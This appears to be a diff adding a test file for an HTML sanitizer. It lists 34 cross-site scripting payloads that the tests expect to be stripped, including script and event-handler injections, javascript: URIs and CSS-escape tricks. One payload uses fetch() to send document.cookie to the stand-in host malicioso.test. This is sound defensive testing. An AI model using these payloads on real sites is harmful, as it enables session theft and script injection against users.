@@ -1,0 +1,83 @@
+import kernel.html.*
+
+// Every line is a classic attack; the result must contain none of it.
+List<String> attackPayloads() = listOf("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)></svg>", "<svg><script>alert(1)</script></svg>", "<math><mtext><script>alert(1)</script></mtext></math>", "<body onload=alert(1)>", "<div onmouseover=alert(1)>texto</div>", "<a href=\"javascript:alert(1)\">clique</a>", "<a href=\"  JaVaScRiPt:alert(1)\">clique</a>", "<a href=\"data:text/html,<script>alert(1)</script>\">clique</a>", "<img src=\"javascript:alert(1)\">", "<style>@import url(\"https://malicioso.test/x.css\");</style><p>ok</p>", "<style>div{width:expression(alert(1))}</style><p>ok</p>", "<style>div{background:url(javascript:alert(1))}</style><p>ok</p>", "<p style=\"background:url('javascript:alert(1)')\">ok</p>", "<link rel=\"stylesheet\" href=\"https://malicioso.test/x.css\">", "<meta http-equiv=\"refresh\" content=\"0;url=https://malicioso.test\">", "<base href=\"https://malicioso.test/\">", "<form action=\"https://malicioso.test\"><input name=senha></form>", "<object data=\"https://malicioso.test/x.swf\"></object>", "<embed src=\"https://malicioso.test/x.swf\">", "<iframe src=\"https://malicioso.test\"></iframe>", "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "<p>texto</p><script>fetch('https://malicioso.test/'+document.cookie)</script>", "<img src=x onerror=\"parent.document.body.innerHTML='tomado'\">", "</style><script>alert(1)</script><p>ok</p>", "<div style=\"position:fixed;inset:0;background:url(https://malicioso.test/pixel)\">capa</div>", "<style>div{background:\\75rl(https://malicioso.test/x)}</style><p>ok</p>", "<style>div{background:\\u\\r\\l(https://malicioso.test/x)}</style><p>ok</p>", "<p style=\"background:\\000075\\72 \\6c(https://malicioso.test/p)\">ok</p>", "<style>@\\69mport \"https://malicioso.test/x.css\";</style><p>ok</p>", "<style>div{width:expr/**/ession(alert(1))}</style><p>ok</p>", "<style>div{width:\\65xpression(alert(1))}</style><p>ok</p>", "<style>div{background:image-set(\"https://malicioso.test/x.png\" 1x)}</style><p>ok</p>")
+
+String attackProblem(payload: String, checked: String) {
+    if (checked.contains("<script")) {
+        return "script em: " + payload
+    }
+    if (checked.contains("<iframe") && !checked.contains("youtube") && !checked.contains("vimeo")) {
+        return "quadro de host desconhecido em: " + payload
+    }
+    if (checked.contains("<object") || checked.contains("<embed")) {
+        return "plugin em: " + payload
+    }
+    if (checked.contains("<form") || checked.contains("<input")) {
+        return "formulario em: " + payload
+    }
+    if (checked.contains("<meta") || checked.contains("<base") || checked.contains("<link")) {
+        return "cabeca injetada em: " + payload
+    }
+    if (checked.contains("javascript:")) {
+        return "esquema javascript em: " + payload
+    }
+    if (checked.contains("malicioso.test")) {
+        return "host do ataque em: " + payload
+    }
+    if (checked.contains("alert(")) {
+        return "chamada de alerta em: " + payload
+    }
+    if (checked.matches("(?s).*\\son[a-z]+\\s*=.*")) {
+        return "atributo de evento em: " + payload
+    }
+    if (checked.contains("@import") || checked.contains("expression(")) {
+        return "css perigoso em: " + payload
+    }
+    return ""
+}
+
+test "no payload survives sanitization" {
+    var payloads = attackPayloads()
+    assert(payloads.size() == 34)
+    for (var payload in payloads) {
+        var clean = SafeHtml.sanitizePageHtml(payload)
+        var checked = ""
+        if (clean != null) {
+            checked = clean.toLowerCase()
+        }
+        var problem = attackProblem(payload, checked)
+        if (problem != "") {
+            throw "FAIL " + problem
+        }
+    }
+}
+
+String attackClean(raw: String) {
+    var out = SafeHtml.sanitizePageHtml(raw)
+    if (out == null) {
+        return "<null>"
+    }
+    return out
+}
+
+test "keeps css escapes that do not spell a name" {
+    var clean = attackClean("<style>q::before{content:\"\\201C\"}</style><q>ok</q>")
+    assert(clean.contains("content:\"\\201C\""))
+}
+
+test "links get a controlled target and rel" {
+    var clean = attackClean("<a href=\"https://exemplo.com\" target=\"_top\" rel=\"opener\">site</a>")
+    assert(clean.contains("target=\"_blank\""))
+    assert(clean.contains("rel=\"noopener noreferrer\""))
+    assert(!clean.contains("_top"))
+    assert(!clean.contains("rel=\"opener\""))
+}
+
+test "ordinary content survives" {
+    var clean = attackClean("<h1>Meu portfólio</h1>\n<p>Escrevo sobre <em>arquitetura</em> e <strong>sistemas distribuídos</strong>.</p>\n<ul><li>Java</li><li>Kotlin</li></ul>\n<figure><img src=\"https://exemplo.com/foto.jpg\" alt=\"foto\"></figure>\n<p><a href=\"https://exemplo.com/blog\">Meu blog</a></p>\n")
+    assert(clean.contains("Meu portfólio"))
+    assert(clean.contains("<li>Java</li>"))
+    assert(clean.contains("Meu blog"))
+    assert(clean.contains("href=\"https://exemplo.com/blog\""))
+}
